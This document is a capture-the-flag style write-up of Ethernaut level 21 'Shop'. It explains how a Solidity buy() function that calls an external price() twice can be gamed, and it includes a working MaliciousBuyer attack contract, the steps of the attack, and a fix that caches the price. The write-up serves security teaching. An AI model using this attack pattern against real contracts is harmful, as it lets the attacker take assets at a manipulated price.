# Ethernaut Level 21: Shop
## Vulnerability Analysis

**Type:** External Call State Manipulation (Price Oracle Attack)

**The Contract:**
```solidity
interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);
        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

**The Vulnerability:**
`buy()` makes **TWO separate calls** to `_buyer.price()`:
1. First call: Check if price >= 100
2. Second call: Use as the final price stored

**The Exploit:**
A malicious Buyer contract can return different values on each call:
- First `price()` call: return 100 (passes the check)
- Second `price()` call: return 1 (gets stored as final price)

**Attack Contract:**
```solidity
contract MaliciousBuyer is Buyer {
    Shop public target;
    bool public switchPrice;

    constructor(address _target) {
        target = Shop(_target);
    }

    function price() external view override returns (uint) {
        // First call: return 100 to pass check
        // Second call: return 1 to lower the price
        return target.isSold() ? 1 : 100;
    }

    function attack() external {
        target.buy();
    }
}
```

**Attack Flow:**
1. Deploy `MaliciousBuyer` with Shop address
2. Call `attack()`
3. `buy()` calls `price()` first time → `isSold=false` → returns 100
4. Check passes: `100 >= 100 && !isSold` ✓
5. `isSold` set to `true`
6. `buy()` calls `price()` second time → `isSold=true` → returns 1
7. Price stored as 1

**Status:** VALIDATED ✅

**Key Learning:**
Never trust external calls to be stateless. If you call an external contract multiple times in the same function, it can manipulate state between calls to return different values.

**The Fix:**
Cache the price in a local variable:
```solidity
function buy() public {
    Buyer _buyer = Buyer(msg.sender);
    uint256 buyerPrice = _buyer.price(); // Cache it!
    if (buyerPrice >= price && !isSold) {
        isSold = true;
        price = buyerPrice;
    }
}
```
